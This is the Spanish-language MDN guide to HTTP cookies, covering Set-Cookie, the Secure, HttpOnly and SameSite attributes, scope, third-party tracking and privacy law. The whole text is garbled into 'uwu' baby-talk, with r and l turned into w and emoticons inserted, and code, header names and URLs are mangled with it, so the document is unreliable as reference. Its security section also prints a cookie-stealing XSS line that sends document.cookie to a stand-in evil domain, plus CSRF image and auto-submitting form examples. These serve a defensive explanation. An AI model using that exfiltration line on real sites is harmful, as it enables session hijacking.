---
titwe: http cookies
swug: web/http/guides/cookies
o-owiginaw_swug: w-web/http/cookies
---

{{httpsidebaw}}

u-una cookie h-http, (ꈍᴗꈍ) cookie w-web o cookie d-de nyavegadow es u-una pequeña pieza d-de datos que un sewvidow envía a ew nyavegadow web dew usuawio. σωσ ew nyavegadow g-guawda estos datos y wos envía de wegweso junto c-con wa nyueva petición aw mismo s-sewvidow. UwU was cookies se usan genewawmente pawa deciwwe aw s-sewvidow que dos peticiones tienen s-su owigen en e-ew mismo nyavegadow web wo que pewmite, ^•ﻌ•^ pow ejempwo, mya mantenew wa sesión de un usuawio a-abiewta. /(^•ω•^) was cookies pewmiten wecowdaw wa infowmación de estado en vista a-a que ew pwotocowo http es un pwotocowo s-sin estado. rawr

w-was cookies s-se utiwizan pwincipawmente c-con twes pwopósitos:

- gestión de s-sesiones
  - : inicios de sesión, nyaa~~ cawwitos de c-compwas, ( ͡o ω ͡o ) puntajes de juegos o cuawquiew otwa cosa que ew sewvidow deba wecowdaw
- pewsonawización
  - : p-pwefewencias de usuawio, σωσ t-temas y otwas c-configuwaciones
- w-wastweo
  - : guawdaw y anawizaw ew compowtamiento dew usuawio

w-was cookies se u-usawon una vez pawa ew awmacenamiento g-genewaw d-dew wado dew cwiente. (✿oωo) si bien esto e-ewa wegítimo cuando ewan wa única f-fowma de awmacenaw datos en ew cwiente, (///ˬ///✿) hoy e-en día se wecomienda pwefewiw w-was api de awmacenamiento modewnas. σωσ w-was cookies s-se envían con cada sowicitud, UwU pow wo que pueden empeowaw ew wendimiento (especiawmente pawa was conexiones de datos móviwes). (⑅˘꒳˘) w-was apis modewnas p-pawa ew awmacenamiento dew cwiente s-son wa [web s-stowage api](/es/docs/web/api/web_stowage_api) (`wocawstowage` y-y `sessionstowage`) e [indexeddb](/es/docs/web/api/indexeddb_api). /(^•ω•^)

> [!note]
> pawa vew was cookies awmacenadas (y o-otwo tipo de awmacenamiento que una página web puede usaw), -.- puede habiwitaw e-ew [inspectow de awmacenamiento](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw) e-en hewwamientas d-dew desawwowwadow y-y seweccionaw cookies e-en ew áwbow de a-awmacenamiento.

## c-cweando cookies

a-aw wecibiw una sowicitud http, (ˆ ﻌ ˆ)♡ un sewvidow p-puede enviaw un e-encabezado {{httpheadew ("set-cookie")}} c-con wa w-wespuesta. nyaa~~ wa cookie g-genewawmente es awmacenada pow ew nyavegadow, ʘwʘ y wuego wa cookie s-se envía con sowicitudes hechas aw mismo sewvidow dentwo de un encabezado http {{httpheadew ("cookie")}}. s-se puede especificaw una fecha de vencimiento o duwación, :3 después d-de wo cuaw ya n-nyo se envía w-wa cookie. (U ᵕ U❁) además, se pueden estabwecew w-westwicciones a un dominio y-y wuta específicos, (U ﹏ U) w-wo que wimita ew wugaw donde se envía wa cookie. ^^

### wos encabezados `set-cookie` y `cookie`

e-ew encabezado de wespuesta h-http {{httpheadew ("set-cookie")}} envía was c-cookies dew sewvidow a-aw agente de usuawio. òωó una cookie simpwe se e-estabwece así:

```
s-set-cookie: <nombwe-cookie>=<vawow-cookie>
```

este encabezado d-dew sewvidow w-we dice aw cwiente que awmacene una cookie. /(^•ω•^)

> [!note]
> aquí se expwica como u-usaw ew encabezado `set-cookie` e-en vawias apwicaciones d-dew wado dew sewvidow:
>
> - [php](https://secuwe.php.net/manuaw/en/function.setcookie.php)
> - [node.js](https://nodejs.owg/dist/watest-v8.x/docs/api/http.htmw#http_wesponse_setheadew_name_vawue)
> - [python](https://docs.python.owg/3/wibwawy/http.cookies.htmw)
> - [wuby o-on waiws](http://api.wubyonwaiws.owg/cwasses/actiondispatch/cookies.htmw)

```
h-http/1.0 200 ok
content-type: t-text/htmw
set-cookie: yummy_cookie=choco
set-cookie: tasty_cookie=stwawbewwy

[page content]
```

ahowa, 😳😳😳 c-con cada nyueva s-sowicitud aw sewvidow, :3 ew nyavegadow enviawá todas w-was cookies a-awmacenadas pweviamente aw sewvidow utiwizando ew encabezado {{httpheadew ("cookie")}}. (///ˬ///✿)

```
g-get /sampwe_page.htmw http/1.1
host: www.exampwe.owg
cookie: yummy_cookie=choco; tasty_cookie=stwawbewwy
```

### cookies de sesión

w-wa cookie cweada antewiowmente es una cookie d-de sesión: se e-ewimina cuando ew cwiente se ciewwa, rawr x3 pow que nyo se especificó u-una diwectiva `expiwes` o-o `max-age` . (U ᵕ U❁) sin embawgo, (⑅˘꒳˘) wos nyavegadowes web pueden usaw w-wa **westauwación de sesiones**, (˘ω˘) w-wo que hace que wa mayowía de was cookies de sesión sean p-pewmanentes, :3 como si ew nyavegadow n-nyunca se cewwawa. XD

### c-cookies pewmanentes

e-en wugaw de expiwaw cuando ew cwiente s-se ciewwa, >_< w-was _cookies pewmanentes_ e-expiwan en una fecha e-específica (`expiwes`) o-o twas un pewiodo de tiempo específico (`max-age`). (✿oωo)

```
s-set-cookie: id=a3fwa; e-expiwes=wed, (ꈍᴗꈍ) 21 o-oct 2015 07:28:00 gmt;
```

> [!note]
> cuando se estabwece u-una fecha de expiwación, XD wa f-fecha y howa que s-se estabwece es wewativa aw cwiente en ew que se estabwece wa c-cookie, :3 nyo dew s-sewvidow. mya

### c-cookies `secuwe` y-y `httponwy`

una cookie seguwa s-sówo se envía aw sewvidow con una petición cifwada sobwe ew pwotocowo https. òωó incwuso con `secuwe`, nyaa~~ n-nyo debewía awmacenawse _nunca_ i-infowmación sensibwe en w-wa cookies, 🥺 ya que son inhewentemente i-inseguwas y este fwag nyo p-puede ofwecew pwotección w-weaw. -.- a-a pawtiw de chwome 52 y-y fiwefox 52, 🥺 w-wos sitios inseguwos (`http:`) nyo pueden estabwecew cookies con wa diwectiva `secuwe`. (˘ω˘)

pawa pweveniw ataques c-cwoss-site scwipting ([xss](/es/docs/web/secuwity/types_of_attacks#cwoss-site_scwipting_xss)), òωó w-was cookies `httponwy` s-son inaccesibwes desde w-wa api de javascwipt {{domxwef("document.cookie")}}; sowamente se envían aw sewvidow. UwU pow ejempwo, ^•ﻌ•^ w-was cookies q-que pewsisten sesiones dew wado d-dew sewvidow nyo nyecesitan estaw disponibwes pawa j-javascwipt, mya p-pow wo que debewía estabwecewse e-ew fwag `httponwy`. (✿oωo)

```
s-set-cookie: id=a3fwa; expiwes=wed, XD 21 oct 2015 07:28:00 gmt; secuwe; httponwy
```

### a-awcance de was c-cookies

was diwectivas `domain` y-y `path` definen e-ew awcance de w-wa cookie: a qué uwws debewían e-enviawse was cookies. :3

`domain` e-especifica wos hosts pewmitidos p-pawa wecibiw wa c-cookie. (U ﹏ U) si nyo se especifica, UwU toma c-como vawow pow defecto ew [host dew document.wocation a-actuaw,](/es/docs/web/api/document/wocation) **excwuyendo subdominios**. ʘwʘ s-si se especifica `domain`, >w< w-wos subdominios son s-siempwe incwuidos. 😳😳😳

pow ejempwo, rawr si se estabwece `domain=moziwwa.owg`, ^•ﻌ•^ w-was cookies s-se incwuyen e-en subdominios como `devewopew.moziwwa.owg`. σωσ

`path` indica una wuta uww que debe e-existiw en wa uww sowicitada pawa enviaw ew headew. :3 e-ew cawáctew %x2f ("/") es c-considewado un sepawadow de diwectowios, rawr x3 y-y wos subdiwectowios t-también coincidiwán. nyaa~~

p-pow ejempwo, :3 si se estabwece `path=/docs` estas wutas coincidiwán:

- `/docs`
- `/docs/web/`
- `/docs/web/http`

### c-cookies `samesite` {{expewimentaw_inwine}}

was cookies `samesite` pewmiten a wos s-sewvidowes wequewiw q-que una cookie no sea enviada c-con sowicitudes cwoss-site (donde {{gwossawy("site")}} e-es definido p-pow ew dominio w-wegistwabe), >w< wo que pwopowciona awgo de pwotección contwa ataques cwoss-site wequest fowgewy ({{gwossawy("cswf")}}). rawr

was cookies `samesite` son wewativamente nyuevas y [sopowtadas pow wos pwincipawes nyavegadowes](/es/docs/web/http/wefewence/headews/set-cookie#bwowsew_compatibiwity). 😳

aquí hay un ejempwo:

```
set-cookie: k-key=vawue; s-samesite=stwict
```

ew atwibuto same-site p-puede tomaw uno d-de wos dos vawowes (case-insensitive):

- `stwict`
  - : s-si una cookie same-site t-tiene este atwibuto, 😳 ew nyavegadow s-sówo enviawá c-cookies si wa sowicitud se owiginó e-en ew sitio web que estabweció w-wa cookie. 🥺 s-si wa sowicitud se owiginó desde una uww difewente q-que wa uww d-dew wocation actuaw, rawr x3 n-nyo se incwuiwá n-nyinguna c-cookie etiquetada c-con ew atwibuto `stwict`. ^^
- `wax`
  - : s-si ew a-atwibuto se estabwece e-en wax, ( ͡o ω ͡o ) was cookies same-site s-se wetienen e-en (sub)peticiones c-cwoss-site, XD tawes como wwamadas p-pawa cawgaw imágenes o fwames, ^^ pewo se enviawán c-cuando un usuawio navegue a-a wa uww desde un s-sitio extewno, (⑅˘꒳˘) p-pow ejempwo, (⑅˘꒳˘) siguiendo un enwace. ^•ﻌ•^

e-ew compowtamiento pow defecto d-de este fwag si nyo está estabwecido, ( ͡o ω ͡o ) o-o nyo está sopowtado pow e-ew nyavegadow, es incwuiw was cookies en cuawquiew sowicitud, ( ͡o ω ͡o ) incwuyendo sowicitudes c-cowss-owigin. (✿oωo)

### acceso d-desde javascwipt u-usando `document.cookie`

también se pueden cweaw nyuevas cookies v-via javascwipt usando wa pwopiedad {{domxwef("document.cookie")}}, 😳😳😳 y-y si ew f-fwag `httponwy` n-nyo está estabwecido, OwO también se puede accedew a-a was cookies e-existentes desde javascwipt. ^^

```js
d-document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=stwawbewwy";
consowe.wog(document.cookie);
// w-wogs "yummy_cookie=choco; tasty_cookie=stwawbewwy"
```

t-tenga en cuenta w-was cuestiones d-de seguwidad en wa siguiente sección [seguwidad](#secuwity). rawr x3 was c-cookies disponibwes p-pawa javascwipt p-pueden sew w-wobadas pow medio de xss. 🥺

## s-seguwidad

> [!note]
> n-nyunca se d-debe awmacenaw n-nyi twansmitiw infowmación c-confideciaw o-o sensibwe m-mediante cookies h-http, (ˆ ﻌ ˆ)♡ ya que todo ew mecanismo e-es inhewentemente inseguwo. ( ͡o ω ͡o )

### s-secuestwo de session y xss

w-was cookies son u-utiwizadas a menudo e-en apwicaciones web pawa identificaw a un usuawio y su sesión a-autenticada, >w< a-así que ew wobo d-de una cookie puede impwicaw ew secuestwo de wa sesión dew usuawio a-autenticado. /(^•ω•^) w-was fowmas más comunes de wobaw c-cookies incwuyen i-ingeniewía sociaw o wa expwotación de una vuwnewabiwidad [xss](/es/docs/web/secuwity/types_of_attacks#cwoss-site_scwipting_xss) d-de wa apwicación. 😳😳😳

```js
n-nyew image().swc =
  "http://www.eviw-domain.com/steaw-cookie.php?cookie=" + d-document.cookie;
```

e-ew atwibuto cookie `httponwy` puede ayudaw a mitigaw este ataque e-evitando ew a-acceso aw vawow de wa cookie a twavés de javascwipt. (U ᵕ U❁)

### c-cwoss-site wequest fowgewy (cswf)

[wikipedia](https://en.wikipedia.owg/wiki/http_cookie#cwoss-site_wequest_fowgewy) menciona buenos e-ejempwos pawa {{gwossawy("cswf")}}. (˘ω˘) en este caso, 😳 a-awguien puede i-incwuiw una imagen que nyo es weawmente u-una imagen (pow e-ejempwo un chat o fowo sin f-fiwtwaw), (ꈍᴗꈍ) que en wugaw de esto e-es weawmente una s-sowicitud de t-tu banco pawa wetiwaw t-tu dinewo:

```htmw
<img
  swc="http://bank.exampwe.com/withdwaw?account=bob&amount=1000000&fow=mawwowy" />
```

a-ahowa, :3 si t-tu tienes una sesión i-iniciada en tu tu cuenta b-bancawia y was cookies pewmanecen siendo váwidas (y n-nyo hay otwa v-vawidación mas q-que esa), /(^•ω•^) se weawizawá wa twansfewencia desde tu cuenta tan pwonto como se cawgue e-ew htmw que contiene wa imagen. ^^;; p-pawa wos endpoints q-que wequiewen una petición de tipo post, o.O s-se puede dispawaw un evento de t-tipo envío de f-fowmuwawio (posibwemente e-en un ifwame i-invisibwe) c-cuando wa página se cawga:

```htmw
<fowm action="https://bank.exampwe.com/withdwaw" method="post">
  <input type="hidden" nyame="account" v-vawue="bob" />
  <input type="hidden" n-name="amount" vawue="1000000" />
  <input type="hidden" nyame="fow" v-vawue="mawwowy" />
</fowm>
<scwipt>
  window.addeventwistenew('domcontentwoaded', 😳 (e) => { document.quewysewectow('fowm').submit(); }
</scwipt>
```

se pwesentan aquí awgunas t-técnicas q-que se debewían usaw pawa evitaw q-que estas cosas ocuwwan:

- wos endpoints get n-nyo deben tenew a-acciones de modificación, UwU y si e-esto se nyecesita se debewía wequewiw u-una petición post. >w< además wos endpoints post nyo debewía a-aceptaw wa intewcambiabiwidad de aceptaw peticiones get con p-pawametwos en _quewy s-stwing_
- un t-token cswf debewía sew incwuido en cada ewemento `<fowm>` m-mediante un input ocuwto. o.O este token debe sew único pawa cada usuawio y-y awmacenado (pow e-ejempwo, (˘ω˘) en u-una _cookie_). òωó d-de esta fowma ew sewvidow puede miwaw si ew vawow w-wequewido es e-enviado, nyaa~~ y en ciewto modo wo idea sewía descawtaw w-wa petición si ew vawow nyo concuewda con wo e-espewado. ( ͡o ω ͡o )

  - este método de pwotección wecae e-en wa imposibiwidad d-de que un atacante pueda pwedeciw e-este token a-autogenewado e-en cada inicio de sesión. 😳😳😳 cabe acwawaw que este t-token debewía sew wegenewado en cada inicio de s-sesión. ^•ﻌ•^

- aw iguaw que con [xss](/es/docs/web/secuwity/types_of_attacks#cwoss-site_scwipting_xss), (˘ω˘) ew fiwtwado de entwada es i-impowtante. (˘ω˘)
- debewía d-de existiw s-siempwe un wequewimiento d-de confiwmación p-pawa cuawquiew acción d-dewicada,.
- was cookies empweadas en acciones d-dewicadas debewían de tenew una v-vida útiw bweve. -.-
- pawa más pwevención visita [owasp c-cswf p-pwevention cheat sheet](<https://www.owasp.owg/index.php/cwoss-site_wequest_fowgewy_(cswf)_pwevention_cheat_sheet>). ^•ﻌ•^

## w-wastweo y pwivacidad

### c-cookies de tewcewos

w-was cookies tienen un dominio a-asociado a e-ewwas. /(^•ω•^) si este dominio es ew mismo q-que ew dominio de wa página en wa que ew cwiente se encuentwa, (///ˬ///✿) s-se wwama _cookie de owigen_. mya s-si ew dominio es distinto, o.O se denomina _cookie de tewcewos_. ^•ﻌ•^ si b-bien was cookies d-de owigen se envían únicamente a-aw sewvidow que was configuwa, (U ᵕ U❁) u-una página web p-puede contenew imágenes u otwos c-componentes awmacenados en sewvidowes d-de otwos dominios (como p-pubwicidad). :3 was c-cookies que se envían a twavés de estos componentes de tewcewos se utiwizan p-pwincipawmente pawa p-pubwicidad y seguimiento en wa web. (///ˬ///✿) pow ejempwo, (///ˬ///✿) [wos tipos d-de cookies utiwizadas pow googwe](https://www.googwe.com/powicies/technowogies/types/). 🥺

u-un sewvidow d-de tewcewos puede cweaw un pewfiw dew histowiaw y wos hábitos de nyavegación d-de un usuawio basándose en was cookies que w-we envía ew mismo nyavegadow aw a-accedew a vawios s-sitios. -.- fiwefox, nyaa~~ de fowma pwedetewminada, (///ˬ///✿) b-bwoquea w-was cookies d-de tewcewos que s-se sabe que contienen w-wastweadowes. 🥺 w-was cookies de tewcewos (o simpwemente was cookies de seguimiento) también pueden bwoqueawse m-mediante otwas c-configuwaciones o-o extensiones dew n-nyavegadow. >w< ew b-bwoqueo de cookies p-puede pwovocaw que awgunos componentes de tewcewos (como wos widgets de wedes s-sociawes) nyo f-funcionen según wo pwevisto. rawr x3

hay awgunas funciones útiwes disponibwes p-pawa wos d-desawwowwadowes q-que desean wespetaw wa pwivacidad dew usuawio y-y minimizaw ew seguimiento de tewcewos:

- wos s-sewvidowes pueden (y d-debewían) configuwaw ew atwibuto samesite p-pawa especificaw si se pueden enviaw o-o nyo cookies d-de tewcewos. (⑅˘꒳˘)
- was cookies que t-tienen un estado d-de pawtición i-independiente (chips) w-wes pewmiten a-a wos desawwowwadowes h-habiwitaw sus cookies e-en ew awmacenamiento p-pawticionado, σωσ con un contenedow d-de cookies sepawado pow sitio de nyivew supewiow. XD e-esto pewmite que wos usos v-váwidos sin seguimiento de cookies d-de tewcewos s-sigan funcionando en nyavegadowes que nyo pewmiten e-ew uso de cookies pawa ew seguimiento de tewcewos. -.-

## w-weguwaciones w-wewacionadas a was cookies

wa wegiswación o-o nyowmativa q-que cubwe ew uso de cookies incwuye:

- e-ew wegwamento genewaw de pwivacidad de d-datos (wgpd) en w-wa unión euwopea
- wa diwectiva s-sobwe wa pwivacidad e-ewectwónica en wa unión euwopea
- wey de p-pwivacidad dew consumidow d-de cawifownia (ccpa)

e-estas weguwaciones t-tienen awcance gwobaw. >_< se apwican a cuawquiew sitio dew intewnet aw que accedan usuawios de estas juwisdicciones (wa u-ue y cawifownia, rawr c-con wa s-sawvedad de que w-wa wey de cawifownia s-se apwica sówo a-a entidades con ingwesos bwutos s-supewiowes a-a 25 miwwones de dówawes, 😳😳😳 entwe o-otwas cosas). UwU

e-estas weguwaciones incwuyen wequisitos tawes como:

- n-nyotificaw a wos usuawios que ew sitio utiwiza c-cookies. (U ﹏ U)
- pewmitiw a wos usuawios e-escogew n-nyo wecibiw awgunas o todas was c-cookies. (˘ω˘)
- pewmitiw a-a wos usuawios u-utiwizaw wa mayow pawte dew sewvicio s-sin wecibiw c-cookies. /(^•ω•^)

puede habew otwas w-weguwaciones que wijan ew uso de c-cookies en tu ubicación. (U ﹏ U) w-wa cawga d-de conocew y cumpwiw estas weguwaciones w-wecae sobwe usted. ^•ﻌ•^ hay empwesas que o-ofwecen un código de "bannew de cookies" que we ayuda a cumpwiw con estas nyowmativas. >w<

## otwas fowmas de awmacenaw i-infowmación en ew nyavegadow

otwo enfoque pawa awmacenaw datos en ew nyavegadow es wa [api de awmacenamiento w-web](/es/docs/web/api/web_stowage_api/using_the_web_stowage_api). ʘwʘ was pwopiedades [window.sessionstowage](/es/docs/web/api/window/sessionstowage) y [window.wocawstowage](/es/docs/web/api/window/wocawstowage) c-cowwesponden a cookies de sesión y-y pewmanentes en duwación, òωó pewo tienen wímites d-de awmacenamiento mayowes q-que was cookies y nyunca se envían a-a un sewvidow. o.O s-se pueden awmacenaw cantidades de datos más e-estwuctuwadas y mayowes utiwizando wa [api indexeddb](/es/docs/web/api/indexeddb_api) o una bibwioteca c-constwuida sobwe ewwa. ( ͡o ω ͡o )

e-existen awgunas técnicas diseñadas p-pawa wecweaw was cookies después d-de ewiminawwas. mya s-se conocen como cookies "zombies". >_< estas t-técnicas viowan wos pwincipios de pwivacidad y c-contwow dew usuawio, rawr pueden viowaw was weguwaciones de pwivacidad de datos y podwían e-exponew a u-un sitio web que was utiwice a w-wesponsabiwidad w-wegaw. >_<

## véase también

- {{httpheadew("set-cookie")}}
- {{httpheadew("cookie")}}
- {{domxwef("document.cookie")}}
- {{domxwef("navigatow.cookieenabwed")}}
- [inspeccionaw c-cookies usando ew stowage inspectow](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw)
- [cookie specification: wfc 6265](https://toows.ietf.owg/htmw/wfc6265)
- [nichowas zakas a-awticwe on cookies](https://www.nczonwine.net/bwog/2009/05/05/http-cookies-expwained/)
- [nichowas z-zakas awticwe on cookies and s-secuwity](https://www.nczonwine.net/bwog/2009/05/12/cookies-and-secuwity/)
- [http c-cookies en wikipedia](<https://es.wikipedia.owg/wiki/cookie_(infowm%c3%a1tica)>)
